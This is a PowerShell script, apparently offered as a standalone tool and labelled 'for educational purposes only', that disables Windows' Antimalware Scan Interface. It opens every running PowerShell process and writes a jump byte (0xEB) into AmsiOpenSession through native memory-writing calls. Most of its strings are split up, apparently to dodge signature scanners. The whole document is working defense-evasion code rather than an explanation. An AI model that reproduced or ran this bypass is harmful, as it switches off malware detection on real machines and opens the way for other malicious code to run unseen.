# ASCII Art Banner
$banner = (('1Vk'+'
'+'
 ').repLACE('1Vk',[StRinG][cHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'_ '+' '+' '+' '+' '+' '+' '+' '+' '+'__'+'_ '+'__'+'_ '+' '+'_____'+'___ '+'_____'+' '+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('kB'+'u ')-crEpLACe'kBu',[cHAR]124)+(('8oR'+' ')  -CREPLaCE'8oR',[Char]124)+' '+' '+' '+' '+' '+' '+'/ '+'_ '+('sC'+'PG'+'RV ').replace('GRV',[STrInG][ChaR]124).replace('sCP','\')+' '+('{0}'+'/ ')-f[ChAR]92+' '+'/ '+' '+('__'+'_{'+'0}_ ') -f[cHAR]124+' '+' '+(('_b'+'d'+'o'+'
 ') -CREPLAce  'bdo',[Char]124)+'_ '+'__'+' '+' '+'_ '+' '+' '+(('_A8'+'O ') -rEpLaCe'A8O',[cHAR]124)+('{0}'+' ') -f[CHAr]124+'_'+'____/ '+('/'+'_{'+'0} ')  -f[ChAR]92+('e'+'fn ').ReplaCE('efn',[strING][char]92)+'. '+' '+'. '+('HLX'+' ').rePlACE(([CHAR]72+[CHAR]76+[CHAR]88),[STrINg][CHAR]92)+(('EaJ'+'--. ') -cRePlAce([cHAR]69+[cHAR]97+[cHAR]74),[cHAR]96)+' '+(('E'+'9P ')-repLAcE ([ChAr]69+[ChAr]57+[ChAr]80),[ChAr]124)+(('O'+'us ')  -crepLacE  'Ous',[chAr]124)+' '+('
'+'v'+'QJ ').REplaCE(([cHAR]118+[cHAR]81+[cHAR]74),[sTriNG][cHAR]124)+('xvk_ ').REPLACe(([cHAr]120+[cHAr]118+[cHAr]107),[StRiNG][cHAr]39)+('f'+'lK'+'4UZ ').rEPlACE(([char]52+[char]85+[char]90),[strIng][char]124).rEPlACE(([char]102+[char]108+[char]75),'\')+(('4'+'NB ') -CrePLacE ([chAR]52+[chAR]78+[chAR]66),[chAR]124)+('elJ ').RePLaCe(([cHaR]101+[cHaR]108+[cHaR]74),[stRinG][cHaR]124)+(('Vbv ')  -crEplAcE'Vbv',[CHar]124)+('Cf'+'g/ ').repLace(([ChAr]67+[ChAr]102+[ChAr]103),'|')+'/ '+'_ '+('QUc'+' ').rEplACE(([CHar]81+[CHar]85+[CHar]99),'\')+' '+'_ '+' '+('iyj ').replaCE('iyj',[sTrINg][ChaR]124)+('JwKbQ0'+'/'+'Jw'+'K ').rEplAce(([ChAr]74+[ChAr]119+[ChAr]75),[STrinG][ChAr]124).rEplAce(([ChAr]98+[ChAr]81+[ChAr]48),'\')+('U5'+'Y8gk--.'+' ').repLAcE(([chAR]85+[chAR]53+[chAR]89),[STRIng][chAR]124).repLAcE('8gk','`')+('f9'+'p'+' ').REpLACE(([ChaR]102+[ChaR]57+[ChaR]112),'\')+('V1'+'b ').ReplaCE(([CHar]86+[CHar]49+[CHar]98),'|')+(('Wj8 ')  -CrEplACE ([cHAR]87+[cHAR]106+[cHAR]56),[cHAR]124)+' '+((''+'
AX4 ') -creplAce'AX4',[char]124)+(('Q'+'pa ')-rEplACe  ([CHar]81+[CHar]112+[CHar]97),[CHar]124)+(('m0H'+' ')  -REPLaCE ([cHAR]109+[cHAR]48+[cHAR]72),[cHAR]124)+('{0}'+' ')-F  [cHAr]124+('{0'+'}'+'_{0} ')  -F [chAr]124+('f'+'7e'+' ').rEPlACe(([chAr]102+[chAr]55+[chAr]101),'|')+' '+' '+'< '+' '+'_'+'_/ '+(('iFb ') -CRepLAce  'iFb',[char]124)+('{'+'0} ') -f[chaR]124+('{0} ')-f  [chAr]124+('{0'+'} ')  -F [ChaR]124+' '+('6f5 ').REPlaCE(([Char]54+[Char]102+[Char]53),'|')+('/{0'+'}__'+'/ ')-F[CHAR]92+('/_G'+'on'+' ').REpLACe(([ChAR]71+[ChAR]111+[ChAR]110),'|')+('{0}_ ') -F  [ChaR]124+('
'+'{'+'0}'+'_{0} ') -F [chaR]124+(('dPo_dPoXl'+'W__,'+'_d'+'Po'+'_d'+'PoXlW_'+'XlW'+'___XlW_'+'dPo'+' ')-crEPLaCe ([CHAr]100+[CHAr]80+[CHAr]111),[CHAr]124  -REpLAce  ([CHAr]88+[CHAr]108+[CHAr]87),[CHAr]92)+(('U1'+'2_U12_U'+'12 ')-cRepLace([CHAR]85+[CHAR]49+[CHAR]50),[CHAR]124)+' '+('O'+'PQ_OPQ'+'_'+'___/'+' ').RepLAce('OPQ','|')+('{0}___/ ')  -F[ChAR]92+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+''+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+''+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
---'+'--'+'--'+'-'+'--------'+'----------'+'-------------'+'-'+'---'+'----'+'------'+'---'+'------'+'-
'+' '+'De'+'v'+'eloped '+'by'+' '+'Abh'+'ishek'+' '+'S'+'h'+'arma '+('P'+'iK ').ReplaCE('PiK',[StrINg][CHAR]124)+'Date:'+' '+'10'+'/'+'08/24'+'
 '+'Cr'+'eated '+'f'+'or '+'educa'+'t'+'iona'+'l '+'purpos'+'e'+'s '+('only
'+'-------'+'-'+'-'+'-------'+'--'+'----'+'--------'+'--'+'--------'+'-----'+'-----------------'+'-'+'
ajI').rEplACE(([cHAr]97+[cHAr]106+[cHAr]73),[sTrING][cHAr]39))

Write-Host $banner -ForegroundColor Green


# Prompt the user for confirmation
$confirmation = Read-Host ('Are you'+' '+'re'+'a'+'dy to n'+'uke'+' AMS'+'I f'+'rom'+' th'+'i'+'s '+'shell?'+' P'+'ress'+' Ente'+'r to conti'+'nue')


Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class NukeAMSI
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // NtOpenProcess: Opens a handle to a process.
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // NtWriteVirtualMemory: Writes to the memory of a process.
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // NtClose: Closes an open handle.
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // LoadLibrary: Loads the specified module into the address space of the calling process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function ModAMSI {
    param (
        [int]$processId
    )

    Write-Host ('M'+'odif'+'ying '+'AM'+'SI '+'f'+'or '+'p'+'rocess '+'ID:'+' '+"$processId") -ForegroundColor Cyan

    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior

    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
    $clientId = New-Object NukeAMSI+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host ('Fai'+'led'+' '+'to'+' '+'ope'+'n '+'pro'+'ce'+'ss. '+'NtOpenPro'+'cess'+' '+'status'+':'+' '+"$status") -ForegroundColor Red
        return
    }

    Write-Host ('Lo'+'ading amsi'+'.dll'+'...') -ForegroundColor Cyan
    $amsiHandle = [NukeAMSI]::LoadLibrary(('am'+'s'+'i.dll'))
    if ($amsiHandle -eq [IntPtr]::Zero) {
        Write-Host ('F'+'ailed '+'to'+' load '+'a'+'msi'+'.'+'dll.') -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host ('G'+'etti'+'ng'+' '+'address'+' of'+' Am'+'siOpe'+'n'+'Se'+'ssion function...') -ForegroundColor Cyan
    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, ('AmsiO'+'pe'+'n'+'Session'))
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        Write-Host ('Failed t'+'o find AmsiOpe'+'nSessio'+'n'+' functi'+'on'+' '+'in'+' amsi.dll'+'.') -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    # Calculate the correct patch address by offsetting from AmsiOpenSession function
    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)

    Write-Host ('Chang'+'ing'+' '+'me'+'mo'+'ry '+'pro'+'tect'+'ion '+'at'+' '+'address'+' '+"$patchAddr "+'to'+' '+'P'+'AGE_EXE'+'CUTE_RE'+'ADW'+'R'+'ITE..'+'.') -ForegroundColor Cyan
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host ('F'+'ailed to chan'+'ge m'+'e'+'mor'+'y p'+'ro'+'tection'+'.') -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host ('Pa'+'tching '+'m'+'emory '+'a'+'t '+'a'+'ddr'+'ess '+"$patchAddr "+'wit'+'h '+'by'+'te '+'0xEB..'+'.') -ForegroundColor Cyan
    $bytesWritten = [System.UInt32]0
    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host ('Me'+'m'+'ory '+'patched'+' '+'s'+'ucc'+'essfully'+' '+'at'+' '+'a'+'dd'+'ress '+"$patchAddr.") -ForegroundColor Green
    } else {
        Write-Host ('Fail'+'ed '+'t'+'o '+'p'+'atc'+'h '+'mem'+'ory. '+'NtWri'+'t'+'eVirtual'+'Me'+'mor'+'y '+'status:'+' '+"$status") -ForegroundColor Red
    }

    Write-Host ('Res'+'toring'+' original'+' me'+'m'+'or'+'y '+'protection..'+'.') -ForegroundColor Cyan
    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)

    if (-not $restoreStatus) {
        Write-Host ('Failed to rest'+'o'+'re'+' '+'memory'+' protecti'+'on'+'.') -ForegroundColor Red
    }

    Write-Host ('C'+'los'+'ing '+'h'+'a'+'ndle '+'to'+' '+'pr'+'oce'+'ss '+'wi'+'th '+'ID'+' '+"$processId.") -ForegroundColor Cyan
    [NukeAMSI]::NtClose($hHandle)
}

function ModAllPShells {
    Write-Host ('Modi'+'fying all P'+'o'+'werShell'+' p'+'r'+'ocesses...') -ForegroundColor Cyan
    Get-Process | Where-Object { $_.ProcessName -eq ('powersh'+'e'+'ll') } | ForEach-Object {
        Write-Host ('Mo'+'d'+'ifyi'+'ng '+'pr'+'ocess '+'wit'+'h '+'I'+'D '+"$_.Id") -ForegroundColor Cyan
        ModAMSI -processId $_.Id
    }
}

Write-Host ('Star'+'ting AMS'+'I modific'+'a'+'ti'+'on'+' script...') -ForegroundColor Cyan
ModAllPShells
Write-Host ('AMS'+'I '+'m'+'odi'+'fication s'+'c'+'ript completed.') -ForegroundColor Green
